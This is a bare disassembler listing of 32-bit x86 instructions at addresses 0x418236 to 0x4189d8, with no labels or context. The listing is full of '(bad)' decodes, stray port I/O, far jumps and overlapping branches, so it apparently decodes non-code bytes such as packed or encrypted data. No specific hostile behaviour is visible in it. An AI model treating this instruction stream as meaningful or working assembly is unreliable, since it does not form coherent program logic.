  418236:	pop    ds
  418237:	inc    esp
  418238:	mov    cl,0xe7
  41823a:	push   ss
  41823b:	enter  0x2501,0x79
  41823f:	xchg   esi,eax
  418240:	xor    al,0x9f
  418242:	pop    edi
  418243:	and    BYTE PTR [esi+edi*1-0xc],bh
  418247:	xor    al,0xac
  418249:	xchg   ecx,eax
  41824a:	jl     0x418282
  41824c:	mov    BYTE PTR [ecx],ch
  41824e:	or     al,BYTE PTR [edi+eiz*1+0x3e5ad0c9]
  418255:	xchg   DWORD PTR [ebx-0x2960e5],edi
  41825b:	lock pop es
  41825d:	scas   al,BYTE PTR es:[edi]
  41825e:	in     al,dx
  41825f:	dec    eax
  418260:	mov    ecx,0x93aa43aa
  418265:	outs   dx,BYTE PTR ds:[esi]
  418266:	cmp    BYTE PTR [ecx-0xa],dh
  418269:	or     al,0xc5
  41826b:	(bad)  
  41826c:	sbb    DWORD PTR [ecx],esi
  41826e:	mov    ah,0xed
  418270:	adc    bh,BYTE PTR [ebx-0x1b]
  418273:	and    ebp,0x6aad99e1
  418279:	push   0x7e
  41827b:	es ja  0x4182fc
  41827e:	ins    DWORD PTR es:[edi],dx
  41827f:	xchg   ebp,eax
  418280:	xchg   DWORD PTR [ecx],esi
  418282:	xchg   ebx,eax
  418283:	or     ebp,DWORD PTR [edx]
  418285:	in     al,0x92
  418287:	push   cs
  418288:	mov    esp,ss
  41828a:	and    bh,ch
  41828c:	and    eax,DWORD PTR [esi+0x796da21e]
  418292:	mov    al,ds:0xe3bf7b44
  418297:	shr    ebx,cl
  418299:	xor    DWORD PTR [ebp+ebx*8+0x3a],0xef524f8c
  4182a1:	aaa    
  4182a2:	(bad)  
  4182a4:	and    bh,BYTE PTR [esi-0x14]
  4182a7:	jp     0x41825f
  4182a9:	mov    ?,WORD PTR [eax+0x1b]
  4182ac:	sti    
  4182ad:	outs   dx,DWORD PTR ds:[esi]
  4182ae:	jge    0x418260
  4182b0:	push   ecx
  4182b1:	mov    ebx,ss
  4182b3:	pop    ebp
  4182b4:	outs   dx,BYTE PTR ds:[esi]
  4182b5:	inc    edi
  4182b6:	repz or eax,0x5f930462
  4182bc:	nop
  4182bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182be:	repnz iret 
  4182c0:	clc    
  4182c1:	cmp    edx,ecx
  4182c3:	mov    al,0x29
  4182c5:	jmp    0x109e667a
  4182ca:	(bad)  
  4182cb:	scas   al,BYTE PTR es:[edi]
  4182cc:	dec    ecx
  4182cd:	cmp    dh,al
  4182cf:	in     eax,dx
  4182d0:	(bad)  
  4182d1:	repz out dx,al
  4182d3:	call   0x7506:0x57729437
  4182da:	repnz fisttp DWORD PTR [edx+0x0]
  4182de:	rol    DWORD PTR [edi-0x3000d52f],cl
  4182e4:	es daa 
  4182e6:	push   ss
  4182e7:	clc    
  4182e8:	in     al,0x2b
  4182ea:	mov    DWORD PTR [ebx+0x68079073],0x7b401cde
  4182f4:	sbb    BYTE PTR [ecx-0x8c64d50],bh
  4182fa:	arpl   WORD PTR [ebp+0x76],ax
  4182fd:	sub    BYTE PTR [ebp+0x2dccc108],dl
  418303:	cmc    
  418304:	int3   
  418305:	or     DWORD PTR [ebx],0xfffffff5
  418308:	inc    ebx
  418309:	sub    BYTE PTR [edi],0x62
  41830c:	ins    BYTE PTR es:[edi],dx
  41830d:	cmp    DWORD PTR [esi],esp
  41830f:	call   0x620ff2a5
  418314:	das    
  418315:	fwait
  418316:	jg     0x4182bc
  418318:	jb     0x4182a5
  41831a:	ins    BYTE PTR es:[edi],dx
  41831b:	pushf  
  41831c:	sbb    DWORD PTR [ebp-0x33b622da],ecx
  418322:	inc    edx
  418323:	mov    esp,0x575cf040
  418328:	fldenv [ebp-0x241bf46e]
  41832e:	xchg   edx,eax
  41832f:	push   ss
  418330:	out    dx,eax
  418331:	cli    
  418332:	ret    0x7b9d
  418335:	jns    0x4182eb
  418337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418338:	mov    esi,0x90afecf1
  41833d:	outs   dx,DWORD PTR ds:[esi]
  41833e:	stos   BYTE PTR es:[edi],al
  41833f:	sub    DWORD PTR [esi+0x318d6496],esi
  418345:	mov    ah,0xf
  418347:	pusha  
  418348:	imul   esp,DWORD PTR [edi+edx*2-0x2f],0x4dfe1719
  418350:	pop    ss
  418351:	sbb    al,0x59
  418353:	fs jle 0x4182e0
  418356:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418357:	jle    0x418374
  418359:	mov    edi,ecx
  41835b:	(bad)  
  41835d:	xor    DWORD PTR [ebp-0x4a1ba97d],eax
  418363:	xchg   ebp,eax
  418364:	cmc    
  418365:	xor    eax,0xb96698e9
  41836a:	adc    BYTE PTR [ecx],0xfd
  41836d:	xchg   esp,eax
  41836e:	daa    
  41836f:	sub    cl,dh
  418371:	outs   dx,DWORD PTR ds:[si]
  418373:	mov    cl,0x65
  418375:	lds    eax,FWORD PTR [eax]
  418377:	int    0xdc
  418379:	add    al,0x7c
  41837b:	push   ebx
  41837c:	adc    ecx,DWORD PTR [ecx]
  41837e:	sub    al,0x55
  418380:	test   dl,bh
  418382:	inc    esi
  418383:	(bad)
  418387:	push   esp
  418388:	xor    al,0xc4
  41838a:	lahf   
  41838b:	mov    al,ds:0x42917e98
  418390:	xor    DWORD PTR [ebx],edi
  418392:	jle    0x418368
  418394:	sbb    ebx,DWORD PTR [esi-0x117192bf]
  41839a:	jae    0x418398
  41839c:	mov    ebx,0xa3e61824
  4183a1:	ja     0x418396
  4183a3:	jne    0x418350
  4183a5:	fdivr  QWORD PTR [ebx]
  4183a7:	jae    0x418397
  4183a9:	add    eax,0x58350bc4
  4183ae:	cmp    bh,0x81
  4183b1:	push   0x1d
  4183b3:	dec    esp
  4183b4:	(bad)  
  4183b5:	fldcw  WORD PTR [edx]
  4183b7:	sar    DWORD PTR [edx+0x55283229],0x0
  4183be:	xchg   esi,eax
  4183bf:	jmp    0x418401
  4183c1:	jge    0x41834a
  4183c3:	cmp    al,0x54
  4183c5:	js     0x418438
  4183c7:	dec    edi
  4183c8:	mov    ah,0x8e
  4183ca:	or     dl,BYTE PTR [eax+0x7a]
  4183cd:	out    0x93,eax
  4183cf:	mov    ch,BYTE PTR [esp+ebp*8-0x10]
  4183d3:	adc    bh,BYTE PTR [ebp+0x8]
  4183d6:	scas   eax,DWORD PTR es:[edi]
  4183d7:	imul   esi,edi,0xffffffde
  4183da:	and    DWORD PTR [ecx+0x70faecb2],eax
  4183e0:	mov    ds:0xa40b28,al
  4183e5:	ror    dh,0x38
  4183e8:	push   cs
  4183e9:	stos   DWORD PTR es:[edi],eax
  4183ea:	bound  eax,QWORD PTR [edi+0x718576d6]
  4183f0:	jae    0x418435
  4183f2:	xor    bh,ah
  4183f4:	pop    edx
  4183f5:	or     al,0xe6
  4183f7:	push   esp
  4183f8:	xchg   dh,bl
  4183fa:	mov    ebx,0xb4fba2ab
  4183ff:	push   es
  418400:	aaa    
  418401:	xrelease mov BYTE PTR [edi],0x21
  418405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418406:	jge    0x4183df
  418408:	leave  
  418409:	pop    esi
  41840a:	cs push eax
  41840c:	adc    BYTE PTR [esi],ch
  41840e:	aas    
  41840f:	sbb    esp,eax
  418411:	xor    eax,0x7d533036
  418416:	inc    edx
  418417:	mov    al,ds:0x40e6d3ac
  41841c:	popa   
  41841d:	push   ebp
  41841e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41841f:	je     0x418450
  418421:	mov    cl,0x3
  418423:	ja     0x418447
  418425:	shl    DWORD PTR [esp+edi*4-0x5f],0x90
  41842a:	add    BYTE PTR [edx-0x4f9061f],ah
  418430:	jmp    0x5c9c:0xb59a99f4
  418437:	clc    
  418438:	xlat   BYTE PTR ds:[ebx]
  418439:	repz or BYTE PTR [eax+ebx*2],al
  41843d:	gs mov ebx,0xced44048
  418443:	sub    al,ah
  418445:	mov    dl,BYTE PTR [edx-0x104888c8]
  41844b:	mov    dh,0x2c
  41844d:	test   al,0x86
  41844f:	stos   BYTE PTR es:[edi],al
  418450:	lock fld st(1)
  418453:	pop    es
  418454:	dec    ebp
  418455:	sub    al,0x78
  418457:	sbb    eax,0xf54b6a2a
  41845c:	mov    WORD PTR [edi],?
  41845e:	mov    esi,0xac614576
  418463:	adc    ebx,esi
  418465:	push   esp
  418466:	test   BYTE PTR [ecx],0x5f
  418469:	jg     0x418463
  41846b:	fcom   DWORD PTR [ebp+0x14]
  41846e:	scas   eax,DWORD PTR es:[edi]
  41846f:	pop    ebp
  418470:	adc    ebx,ebp
  418472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418473:	mov    ?,WORD PTR [eax-0x559578d9]
  418479:	dec    ebx
  41847a:	mov    ebp,0x169e0d30
  41847f:	bound  ebp,QWORD PTR [eax+esi*4+0x1a]
  418483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418484:	jns    0x41847c
  418486:	pusha  
  418487:	dec    sp
  418489:	cmp    eax,0xc73e7df0
  41848e:	out    0xdb,eax
  418490:	in     eax,0x50
  418492:	sbb    al,0x9a
  418494:	fidivr DWORD PTR [esi]
  418496:	ret    0xa829
  418499:	pop    ss
  41849a:	xchg   ecx,eax
  41849b:	leave  
  41849c:	or     al,0x81
  41849e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41849f:	div    DWORD PTR [edx-0x6361e108]
  4184a5:	pusha  
  4184a6:	ret    0x8d3f
  4184a9:	cmp    eax,edx
  4184ab:	inc    ebp
  4184ac:	cmp    BYTE PTR [edx+0x50],ah
  4184af:	jecxz  0x41846f
  4184b1:	sahf   
  4184b2:	jg     0x418523
  4184b4:	cmp    al,0xcd
  4184b6:	xchg   ebx,eax
  4184b7:	fstp   DWORD PTR [esi+ebp*4-0x18]
  4184bb:	hlt    
  4184bc:	and    ch,BYTE PTR [eax-0x7a]
  4184bf:	gs dec esp
  4184c1:	cld    
  4184c2:	(bad)  
  4184c4:	jecxz  0x418473
  4184c6:	jecxz  0x4184ef
  4184c8:	lods   al,BYTE PTR fs:[esi]
  4184ca:	retf   0x3eb0
  4184cd:	lahf   
  4184ce:	sub    ebx,DWORD PTR [ebx-0x2f]
  4184d1:	popf   
  4184d2:	jnp    0x418473
  4184d4:	or     al,bh
  4184d6:	mov    eax,ds:0xa05190bc
  4184db:	(bad)  [esi-0x406929c8]
  4184e1:	mov    edx,0xa92f84fb
  4184e6:	aas    
  4184e7:	dec    esi
  4184e8:	jge    0x41852f
  4184ea:	and    BYTE PTR [esi+0x4cfbe22c],0xde
  4184f1:	lods   eax,DWORD PTR ds:[esi]
  4184f2:	fsub   DWORD PTR [ecx-0x15f197c6]
  4184f8:	stos   DWORD PTR es:[edi],eax
  4184f9:	inc    ecx
  4184fa:	pop    es
  4184fb:	in     al,0x9
  4184fd:	aam    0x0
  4184ff:	mov    ecx,0xad3729cb
  418504:	sar    ch,1
  418506:	push   esi
  418507:	adc    ebp,eax
  418509:	call   0x98dfcb9a
  41850e:	adc    esi,DWORD PTR [esi+ebp*1]
  418511:	or     eax,DWORD PTR [ecx+0x13]
  418514:	stos   DWORD PTR es:[edi],eax
  418515:	cdq    
  418516:	cmc    
  418517:	jecxz  0x4184a9
  418519:	inc    esi
  41851a:	xchg   ebp,eax
  41851b:	sbb    BYTE PTR [edx-0x4ac8c55e],0x24
  418522:	pop    edi
  418523:	in     al,0x95
  418525:	nop
  418526:	xor    dh,BYTE PTR [ebx-0x14c813ad]
  41852c:	fiadd  DWORD PTR [ecx+0x56ab7961]
  418532:	in     al,0xb3
  418534:	jo     0x418516
  418536:	mov    ebx,0x5c34743e
  41853b:	je     0x4185a1
  41853d:	jnp    0x4184d3
  41853f:	nop
  418540:	sbb    DWORD PTR [ebp-0x5d],ecx
  418543:	test   DWORD PTR [eax-0x4f],0x45cee271
  41854a:	mov    gs,WORD PTR [eax+0x3e]
  41854d:	push   edi
  41854e:	cmp    al,0x48
  418550:	sub    eax,0x4bd6932e
  418555:	in     al,dx
  418556:	xchg   ebp,eax
  418557:	int3   
  418558:	daa    
  418559:	ret    
  41855a:	mov    esi,0x5c6e3d6a
  41855f:	hlt    
  418560:	imul   esi,DWORD PTR [esi+0x2b142db7],0x11
  418567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418568:	scas   eax,DWORD PTR es:[edi]
  418569:	pop    es
  41856a:	xor    DWORD PTR [esi+0x58055bae],edx
  418570:	int3   
  418571:	outs   dx,DWORD PTR ds:[esi]
  418572:	inc    edx
  418573:	sub    ebp,DWORD PTR [esi-0x7ddc7d7b]
  418579:	xor    DWORD PTR [esi+0x3b],0xe2cc5162
  418580:	push   es
  418581:	or     DWORD PTR [ebp-0x60],ebp
  418584:	js     0x4185fd
  418586:	fdivr  st,st(6)
  418588:	adc    BYTE PTR [ecx],cl
  41858a:	mov    eax,ds:0xd43e16ec
  41858f:	nop
  418590:	cli    
  418591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418592:	inc    ebp
  418593:	cli    
  418594:	xor    al,dh
  418596:	jnp    0x4185ac
  418598:	jg     0x418533
  41859a:	int3   
  41859b:	sbb    al,0x31
  41859d:	mov    ah,0xa5
  41859f:	fs pusha 
  4185a1:	xor    al,0xe9
  4185a3:	add    ebx,ebp
  4185a5:	add    al,0x82
  4185a7:	popa   
  4185a8:	cdq    
  4185a9:	das    
  4185aa:	ins    DWORD PTR es:[edi],dx
  4185ab:	mov    ch,0x7f
  4185ad:	mov    al,0xcd
  4185af:	(bad)  
  4185b1:	sub    esp,DWORD PTR [eax+0x376fc2b9]
  4185b7:	dec    ebx
  4185b8:	dec    ebp
  4185b9:	jg     0x418628
  4185bb:	repz push ecx
  4185bd:	(bad)  
  4185be:	cs mov edx,eax
  4185c1:	xchg   DWORD PTR [edi-0x1c],esp
  4185c4:	mov    ebx,0x78f483a5
  4185c9:	mov    ds:0xefc76018,al
  4185ce:	or     BYTE PTR [ecx-0x17],dl
  4185d1:	aad    0xd
  4185d3:	jnp    0x418585
  4185d5:	aad    0x2c
  4185d7:	mov    bl,0x9d
  4185d9:	mov    edx,0xd3079e41
  4185de:	sbb    WORD PTR [ebp-0x55f36a78],di
  4185e5:	dec    edi
  4185e6:	(bad)  
  4185e7:	cwde   
  4185e8:	push   0xffffff81
  4185ea:	jnp    0x418658
  4185ec:	sub    esp,esp
  4185ee:	sti    
  4185ef:	or     eax,0x98120f3
  4185f4:	jecxz  0x4185dc
  4185f6:	in     eax,dx
  4185f7:	jmp    0x5e74ebe2
  4185fc:	and    ebp,0x13
  4185ff:	std    
  418600:	cli    
  418601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418602:	enter  0xf39b,0xa6
  418606:	push   eax
  418607:	(bad)
  41860a:	loop   0x418688
  41860c:	or     ah,BYTE PTR [edx+eax*1-0x3d]
  418610:	inc    edi
  418611:	jecxz  0x4185e4
  418613:	xchg   esi,eax
  418614:	mov    ebp,DWORD PTR [ecx-0x2011d952]
  41861a:	test   DWORD PTR [edx-0x32],ebx
  41861d:	popa   
  41861e:	lods   eax,DWORD PTR ds:[esi]
  41861f:	call   0xb846d440
  418624:	xchg   edi,eax
  418625:	pop    ebx
  418626:	xchg   ecx,eax
  418627:	(bad)  
  418628:	in     al,0xfe
  41862a:	cdq    
  41862b:	mov    ecx,0x45d8f771
  418630:	mov    eax,0x46e4f03b
  418635:	sbb    al,0xd9
  418637:	mov    dl,0xfe
  418639:	or     eax,0x1bbfdb49
  41863e:	mov    DWORD PTR [ebp-0x38df157c],ecx
  418644:	js     0x41860a
  418646:	xchg   esp,eax
  418647:	retf   0xabb7
  41864a:	xchg   ecx,eax
  41864b:	retf   0xd6e2
  41864e:	sub    dl,bh
  418650:	sub    al,0x16
  418652:	in     eax,0x48
  418654:	xchg   edx,eax
  418655:	mov    eax,0x72fec372
  41865a:	pushf  
  41865b:	jbe    0x41863e
  41865d:	std    
  41865e:	(bad)  
  41865f:	repz sti 
  418661:	ds pop edi
  418663:	pop    eax
  418664:	mov    ebp,0x94a81600
  418669:	bound  esi,QWORD PTR [eax-0x25]
  41866c:	or     DWORD PTR [esi+0x1a],esi
  41866f:	pop    ebx
  418670:	or     DWORD PTR [esi],esi
  418672:	jb     0x418699
  418674:	and    ah,cl
  418676:	jno    0x41868a
  418678:	retf   0xdd97
  41867b:	cmp    eax,0x6a24044e
  418680:	mov    ds:0x37e763b1,al
  418685:	cdq    
  418686:	iret   
  418687:	xchg   DWORD PTR [eax+0x2aebcbea],ebx
  41868d:	into   
  41868e:	mov    bl,0x2e
  418690:	cmp    al,0x56
  418692:	mov    edi,0x528e7874
  418697:	mov    esp,ebx
  418699:	push   ecx
  41869a:	popf   
  41869b:	cmp    BYTE PTR [ebp-0x1c14f7f5],bh
  4186a1:	jp     0x4186a4
  4186a3:	hlt    
  4186a4:	inc    esp
  4186a5:	cld    
  4186a6:	add    dl,BYTE PTR ds:0xc83efaae
  4186ac:	and    cl,BYTE PTR [esi]
  4186ae:	and    eax,0x612d0d7f
  4186b3:	stc    
  4186b4:	mov    DWORD PTR [edx+0x3a],edi
  4186b7:	daa    
  4186b8:	(bad)  
  4186b9:	retf   
  4186ba:	(bad)  
  4186bb:	(bad)  
  4186bd:	cmp    ebp,DWORD PTR [esi+0x0]
  4186c0:	das    
  4186c1:	push   ss
  4186c2:	mov    ebp,0xa6c369ca
  4186c7:	nop
  4186c8:	cdq    
  4186c9:	leave  
  4186ca:	mov    bl,0x7
  4186cc:	ins    BYTE PTR es:[edi],dx
  4186cd:	jbe    0x41868b
  4186cf:	ins    DWORD PTR es:[edi],dx
  4186d0:	jb     0x4186db
  4186d2:	imul   ecx,esp,0xac1e9c8f
  4186d8:	mov    ds:0x1dd7390,eax
  4186dd:	ins    DWORD PTR es:[edi],dx
  4186de:	inc    eax
  4186df:	and    eax,0x2b67b561
  4186e4:	or     BYTE PTR [edx],0x60
  4186e7:	lahf   
  4186e8:	add    eax,0x481a17b
  4186ed:	mov    ds:0xfe12a27b,al
  4186f2:	mov    ebx,0xea1a063b
  4186f7:	cmp    edx,DWORD PTR [ebp-0x73]
  4186fa:	mov    ah,0xbd
  4186fc:	dec    ebp
  4186fd:	ror    DWORD PTR [edi],0x8b
  418700:	xor    eax,0x9b9b0fe7
  418705:	jns    0x418751
  418707:	outs   dx,DWORD PTR ds:[esi]
  418708:	jmp    0x41876a
  41870a:	xchg   esi,eax
  41870b:	test   al,0xb0
  41870d:	retf   
  41870e:	xchg   edi,eax
  41870f:	push   ebp
  418710:	xchg   ebx,eax
  418711:	mov    dh,0xc5
  418713:	sub    BYTE PTR [ebp-0x1572d37],ah
  418719:	ror    al,cl
  41871b:	ins    DWORD PTR es:[edi],dx
  41871c:	mov    edi,0xe1742aa4
  418721:	fstp   st(4)
  418723:	mov    esi,0x220b96e9
  418728:	mov    dh,0x2c
  41872a:	xchg   ebx,eax
  41872b:	sub    DWORD PTR [ebp+0x31],ebx
  41872e:	in     eax,0x1b
  418730:	ror    DWORD PTR [eax-0x4b],1
  418733:	sub    BYTE PTR [ebx],0x6a
  418736:	pop    esp
  418737:	mov    edi,0x460b945
  41873c:	pop    ebp
  41873d:	rcr    BYTE PTR [edx+0x13],cl
  418740:	lea    esi,[esi]
  418742:	call   DWORD PTR [eax+0x76]
  418745:	ficom  WORD PTR ds:0x488d6f4
  41874b:	lea    esi,[eax-0x48]
  41874e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41874f:	addr16 mov ebp,0x62d14797
  418755:	outs   dx,DWORD PTR ds:[esi]
  418756:	dec    edx
  418757:	and    eax,0x13a7a32
  41875c:	iret   
  41875d:	je     0x418702
  41875f:	add    cl,BYTE PTR [edx-0x18]
  418762:	leave  
  418763:	test   al,0x84
  418765:	adc    esp,DWORD PTR [edi+edi*2-0xd]
  418769:	inc    esp
  41876a:	sub    eax,DWORD PTR [esp+eiz*4]
  41876d:	cli    
  41876e:	jns    0x4187d8
  418770:	in     al,dx
  418771:	out    dx,eax
  418772:	push   es
  418773:	dec    esi
  418774:	add    BYTE PTR [edx-0x3f],0x95
  418778:	addr16 mov esi,0x5e9bee98
  41877e:	mov    bh,0x21
  418780:	adc    eax,0x75a4be47
  418785:	popa   
  418786:	pop    ebp
  418787:	test   DWORD PTR [ebx+0x40],esi
  41878a:	mov    ch,0xef
  41878c:	inc    eax
  41878d:	xchg   ebx,eax
  41878e:	pop    eax
  41878f:	sub    bh,bl
  418791:	push   cs
  418792:	sub    eax,0x3a50ca37
  418797:	fs sub esp,esi
  41879a:	test   eax,0x1c0bc741
  41879f:	inc    esi
  4187a0:	jl     0x4187ee
  4187a2:	mov    bh,0x87
  4187a4:	pop    ss
  4187a5:	outs   dx,DWORD PTR ds:[esi]
  4187a6:	inc    ecx
  4187a7:	inc    ecx
  4187a8:	rcl    edx,1
  4187aa:	sahf   
  4187ab:	cli    
  4187ac:	call   0x6742bd7a
  4187b1:	sub    edx,DWORD PTR [eax]
  4187b3:	adc    bh,BYTE PTR [esp+ecx*1+0x6c]
  4187b7:	(bad)  
  4187b8:	in     eax,0x21
  4187ba:	rcl    BYTE PTR [ebp-0x18],1
  4187bd:	jnp    0x418816
  4187bf:	call   0xffef929d
  4187c4:	xor    eax,0x5c407c8
  4187c9:	xchg   ebp,eax
  4187ca:	push   ebx
  4187cb:	repnz sbb ch,BYTE PTR ds:[esi+0x267dadb4]
  4187d3:	inc    ecx
  4187d4:	add    DWORD PTR [eax],0xffffffe0
  4187d7:	or     DWORD PTR [esi],edi
  4187d9:	push   edx
  4187da:	mov    esp,0x14742ebf
  4187df:	inc    esp
  4187e0:	pop    ds
  4187e1:	cwde   
  4187e2:	or     DWORD PTR [edx+eax*8+0x1ab8004e],esi
  4187e9:	in     eax,0x4b
  4187eb:	(bad)  
  4187ec:	in     al,0x7
  4187ee:	call   0x458e:0x14a2e867
  4187f5:	sahf   
  4187f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187f7:	xor    BYTE PTR [ecx+0x777be5f0],ah
  4187fd:	cs xchg esi,eax
  4187ff:	jmp    0x2f09:0x461ba39a
  418806:	fmulp  st(1),st
  418808:	mov    dl,BYTE PTR [ebp-0x3ed05816]
  41880e:	mov    edx,0xf1a4c7f8
  418813:	cli    
  418814:	adc    al,0x3b
  418816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418817:	iret   
  418818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418819:	pop    ebp
  41881a:	aas    
  41881b:	dec    esp
  41881c:	in     al,0x67
  41881e:	stos   DWORD PTR es:[edi],eax
  41881f:	pop    eax
  418820:	xor    eax,0xb384ec76
  418825:	pop    es
  418826:	ret    0x2a6a
  418829:	fst    DWORD PTR es:[ebx+0xf]
  41882d:	inc    esp
  41882e:	imul   eax,DWORD PTR [esi+0x3f],0xf233e6a2
  418835:	sbb    DWORD PTR [edx+0x5c],edx
  418838:	retf   0x9cef
  41883b:	and    BYTE PTR [edi],dl
  41883d:	jmp    0x545a2a57
  418842:	stos   BYTE PTR es:[edi],al
  418843:	fiadd  WORD PTR [esi-0x37]
  418846:	push   edx
  418847:	push   ss
  418848:	loope  0x4187fe
  41884a:	pop    ebp
  41884b:	xchg   DWORD PTR [edi-0x59],ecx
  41884e:	fdivr  DWORD PTR [eax+0x416ea5f]
  418854:	pop    ds
  418855:	fisub  WORD PTR [eax+0x71]
  418858:	jmp    DWORD PTR [esi-0x72f9b68e]
  41885e:	bound  esp,QWORD PTR [ecx+ecx*8]
  418861:	sub    eax,DWORD PTR [eax+edx*2+0x41]
  418865:	pop    ds
  418866:	sbb    al,0x99
  418868:	imul   ebx,DWORD PTR [ecx+ecx*2-0x27fd71c7],0xffffff92
  418870:	outs   dx,BYTE PTR ds:[esi]
  418871:	or     esi,ebp
  418873:	iret   
  418874:	mov    ch,0xa3
  418876:	es (bad) 
  418878:	stc    
  418879:	pop    ebp
  41887a:	or     al,0xa4
  41887c:	sbb    al,0xe4
  41887e:	xchg   ecx,eax
  41887f:	out    dx,eax
  418880:	xchg   ebx,eax
  418881:	or     al,0x11
  418883:	popf   
  418884:	xchg   ebx,eax
  418885:	adc    al,0x4c
  418887:	fcomip st,st(2)
  418889:	fcmovb st,st(0)
  41888b:	sub    cl,BYTE PTR [ebx-0x3ebc5d73]
  418891:	fs pop ebp
  418893:	jg     0x418894
  418895:	jbe    0x418823
  418897:	push   edx
  418898:	push   0x69
  41889a:	clc    
  41889b:	sub    eax,0x9b2c3809
  4188a0:	das    
  4188a1:	and    DWORD PTR [ecx+0x20],esi
  4188a4:	sbb    esp,DWORD PTR [ecx-0x7c]
  4188a7:	mov    al,ss:0xe8692102
  4188ad:	(bad)  
  4188ae:	cli    
  4188af:	jl     0x4188cb
  4188b1:	cmp    eax,0x888cad6f
  4188b6:	jbe    0x418937
  4188b8:	fsubrp st(5),st
  4188ba:	test   al,0xa5
  4188bc:	fld    TBYTE PTR [ebp+edi*1-0x34]
  4188c0:	lds    esi,FWORD PTR ds:0xe1a4ff69
  4188c6:	stos   BYTE PTR es:[edi],al
  4188c7:	dec    edi
  4188c8:	dec    esp
  4188c9:	test   al,0x81
  4188cb:	xchg   DWORD PTR [edx],edi
  4188cd:	and    ebx,esi
  4188cf:	sub    cl,BYTE PTR [edx]
  4188d1:	cwde   
  4188d2:	inc    edx
  4188d3:	and    DWORD PTR [esi+0x54f8c771],0xfffffff6
  4188da:	pslld  mm3,mm4
  4188dd:	fiadd  DWORD PTR [ecx]
  4188df:	ins    DWORD PTR es:[edi],dx
  4188e0:	lods   eax,DWORD PTR ds:[esi]
  4188e1:	xchg   esp,eax
  4188e2:	popf   
  4188e3:	sbb    DWORD PTR [ebp+edi*8-0x46],edx
  4188e7:	mov    ah,0x26
  4188e9:	cli    
  4188ea:	jnp    0x41886f
  4188ec:	rcr    BYTE PTR [ebx+0x37428d62],cl
  4188f2:	lock and eax,0xeefdace2
  4188f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f9:	mov    ebx,es
  4188fb:	jle    0x4188b6
  4188fd:	mov    ebx,0x24ea588c
  418902:	xchg   edx,eax
  418903:	mov    esi,?
  418905:	sahf   
  418906:	xor    eax,0x1d0ab6c4
  41890b:	loopne 0x4188e5
  41890d:	mov    cl,0xff
  41890f:	sahf   
  418910:	push   esi
  418911:	jbe    0x4188ce
  418913:	fldcw  WORD PTR [eax]
  418915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418916:	fisttp WORD PTR [edi+0x137ade1a]
  41891c:	ins    DWORD PTR es:[edi],dx
  41891d:	cwde   
  41891e:	sub    DWORD PTR [edx],edi
  418920:	les    edx,FWORD PTR [ecx-0x62d100e0]
  418926:	popa   
  418927:	or     al,0x6b
  418929:	inc    eax
  41892a:	aam    0x6a
  41892c:	adc    BYTE PTR ds:0xcfb2b8d3,ah
  418932:	fucomip st,st(7)
  418934:	cmp    ax,0xa391
  418938:	or     ecx,ecx
  41893a:	jne    0x41897e
  41893c:	adc    al,0xfd
  41893e:	shr    DWORD PTR [ecx+ecx*2],cl
  418941:	test   BYTE PTR [esi],ah
  418943:	out    dx,al
  418944:	pop    ebx
  418945:	out    0x82,eax
  418947:	dec    edx
  418948:	sbb    al,0xc6
  41894a:	xchg   esp,eax
  41894b:	pop    ecx
  41894c:	lahf   
  41894d:	xchg   ecx,eax
  41894e:	inc    ebp
  41894f:	out    0xd2,eax
  418951:	xor    al,0x9b
  418953:	jnp    0x4188f4
  418955:	sbb    esi,ebx
  418957:	pop    esi
  418958:	or     DWORD PTR [edi-0x45018c0b],ebp
  41895e:	nop
  41895f:	pop    ss
  418960:	pushf  
  418961:	mov    esp,0xff5f34ac
  418966:	push   ds
  418967:	push   es
  418968:	mov    ecx,0x94213c8f
  41896d:	stos   DWORD PTR es:[edi],eax
  41896e:	ja     0x418901
  418970:	pop    edx
  418971:	adc    al,0x82
  418973:	and    al,0xb3
  418975:	jp     0x4188fb
  418977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418978:	sbb    BYTE PTR [eax+0x32c13854],dh
  41897e:	dec    ebx
  41897f:	cli    
  418980:	jmp    0x41892e
  418982:	lahf   
  418983:	fiadd  DWORD PTR [esi]
  418985:	fisttp QWORD PTR [ebx]
  418987:	xchg   dh,al
  418989:	xor    DWORD PTR [edx],ebx
  41898b:	test   eax,0xdf261e5d
  418990:	(bad)  
  418991:	hlt    
  418992:	cli    
  418993:	imul   ebp,DWORD PTR [eax-0x3c],0x3c
  418997:	shl    eax,1
  418999:	xchg   edi,eax
  41899a:	rcl    DWORD PTR [edx+0x70],1
  41899d:	and    esi,DWORD PTR [esi+0x4f525464]
  4189a3:	dec    edx
  4189a4:	jnp    0x418932
  4189a6:	sub    eax,0xd4b42e6e
  4189ab:	cmp    al,0x4c
  4189ad:	(bad)  
  4189ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189af:	cdq    
  4189b0:	inc    esi
  4189b1:	dec    esi
  4189b2:	stos   DWORD PTR es:[edi],eax
  4189b3:	lock cmp ecx,ecx
  4189b6:	fsub   QWORD PTR ds:0xe6549cfd
  4189bc:	sub    eax,0x84b7a07c
  4189c1:	jno    0x418a14
  4189c3:	sbb    ecx,esi
  4189c5:	iret   
  4189c6:	fcom   QWORD PTR [ebx-0x76]
  4189c9:	adc    ecx,0x10
  4189cc:	pop    ebx
  4189cd:	in     eax,dx
  4189ce:	bound  ebp,QWORD PTR [eax]
  4189d0:	adc    eax,0xff7489c1
  4189d5:	aas    
  4189d6:	ss nop
  4189d8:	inc    esp
